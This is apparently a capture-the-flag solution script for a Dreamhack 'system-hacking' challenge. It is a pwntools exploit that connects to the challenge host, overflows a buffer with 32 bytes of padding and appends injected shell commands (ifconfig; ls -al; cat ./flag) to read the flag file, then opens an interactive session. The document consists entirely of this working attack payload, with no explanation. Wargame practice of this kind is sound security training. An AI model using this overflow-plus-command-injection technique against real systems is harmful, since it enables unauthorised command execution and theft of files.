#system-hacking 
# Payload
```python
from pwn import *

p = remote(host="host3.dreamhack.games", port="20311")

payload = b'A'*32
payload += b'ifconfig; ls -al; cat ./flag'

p.send(payload)

p.interactive()
```